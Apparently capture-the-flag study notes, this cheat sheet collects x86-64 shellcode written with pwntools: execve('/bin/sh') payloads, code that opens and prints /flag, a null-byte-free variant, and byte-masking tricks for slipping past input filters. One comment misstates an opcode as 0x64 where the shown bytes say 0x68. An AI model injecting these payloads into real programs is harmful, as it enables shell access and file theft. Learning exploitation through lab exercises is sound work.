# Shellcode

### basic shell 1
```python
shellcode = pwn.asm('''
    mov rax, 59;
    lea rdi, [rip + sh];
    mov rsi, 0;
    mov rdx, 0;
    syscall;
    ret;
sh:
    .string "/bin/sh"
''')
```

### basic shell 2
```python
shellcode = pwn.asm('''
    mov rax, 59;
    mov rbx, 0x0068732f6e69622f;
    push rbx;
    mov rdi, rsp;
    mov rsi, 0;
    mov rdx, 0;
    syscall;
''')
```

### read + write flag (practice-2)
```c
    # fd_flag = open("/flag", O_RDONLY)
    mov rdi, <address of flag_file>;
    mov rsi, 0;
    mov rax, 2;
    syscall;

    # read fd_flag into flag_buffer
    mov rdi, rax;
    mov rax, 0;
    mov rsi, <address of flag_buffer>;
    mov rdx, 100;       
    syscall;

    # write flag_buffer to stdout
    mov rax, 1;
    mov rdi, 1;
    mov rsi, <address of flag_buffer>;
    mov rdx, 100;
    syscall;
                             
    ret;
string:
    .string "/flag"
```


### send /flag 1
- overview:
```c
// 1
fd_flag = open("/flag", O_RONLY);
// 2
sendfile(stdout, fd_flag, 0, 1024);
// 3
exit(EXIT_SUCCESS); 
```
```python
shellcode = pwn.asm('''
    mov rbx, 0x00000067616c662f; # push "/flag", the 'number' is stored in little endien in memory, so acutally '/flag\x00\x00\x00' stored 
    push rbx;                    # /flag now on stack
    mov rax, 2;
    mov rdi, rsp;                # rdi now points to string /flag
    mov rsi, 0;                  # read only 
    syscall;                     # now fd_flag in rax (return value)              

    mov rdi, 1;                  # stdout
    mov rsi, rax;                
    mov rdx, 0;                  # 0 bytes offset
    mov r10, 1000;               # read 1000 bytes
    mov rax, 40;
    syscall;                     # now flag is printed in terminal

    mov rdi, 0; 
    mov rax, 60;
    syscall
''')
```

### send /flag 2
```python
shellcode = pwn.asm('''
    lea rdi, [rip + string]; # fd_flag = open("/flag", O_RDONLY)
    mov rsi, 0;
    mov rax, 2;
    syscall;
                    
    mov rdi, 1; # sendfile(stdout, fd_flag, 0, 1024)
    mov rsi, rax;
    mov rdx, 0;
    mov r10, 1000;
    mov rax, 40;
    syscall;
                             
    ret;
string:
    .string "/flag"
''')
```

### send /flag 3 (no null bytes)
```python
shellcode = pwn.asm('''
    push rbx;
    
    ;#mov rbx, 0x00000067616c662f; # fd_flag = open("/flag", O_RDONLY)
    xor rbx, rbx
    mov bl, 0x67;
    shl rbx, 32;
    add rbx, 0x616c662f;
    push rbx;
    mov rdi, rsp;
    xor rax, rax;
    mov al, 2;   
    xor rsi, rsi;
    syscall;          
     
    xor rdi, rdi; # sendfile(stdout, fd_flag, 0, 1024)
    inc rdi;
    mov rsi, rax;
    xor rdx, rdx;
    xor rax, rax;              
    mov ax, 1000;
    mov r10, rax;
    xor rax, rax;
    mov al, 40;              
    syscall;

    pop rbx;                    
    ret;    
''')
```


### Trick, mask 1 trash byte via PUSH imm8
- 1 byte fix (0x6a), then 1 byte arbitrary
```
shellcode = pwn.asm('''             
    push 0x11; # 6a11 (0x6a plus 1 byte immediate value)
''')
```

### Trick, mask 2 bytes trash via PUSHW imm16
- 2 bytes fix (0x6668), then 2 byte arbitrary
```
pushw 0xb848; # 6668 48b8 (0x6668 plus 2 bytes immediate value)
```

### Trick, mask 4 trash bytes via PUSH imm32
- 1 byte fix (0x64), then 4 bytes arbitrary
```
shellcode = pwn.asm('''
    push 0x11223344; #6844332211 (0x68 plus 4 byte immediate value in little endian)
''')
```

### Trick, jump over trash bytes via JUMP rel8
- 1 byte fix (0xeb) and 1 byte jump offset (-128,+127)
```
shellcode = pwn.asm('''             
    nop; # do sth
    jmp $+4;
    .byte 0x11, 0x22;
    nop; # do sth
''')
```
- one cloud also use a label
```
shellcode = pwn.asm('''             
    nop; # do sth
    jmp continue;
trash:
    .byte 0x11, 0x22;
continue:
    nop; # do sth
''')
```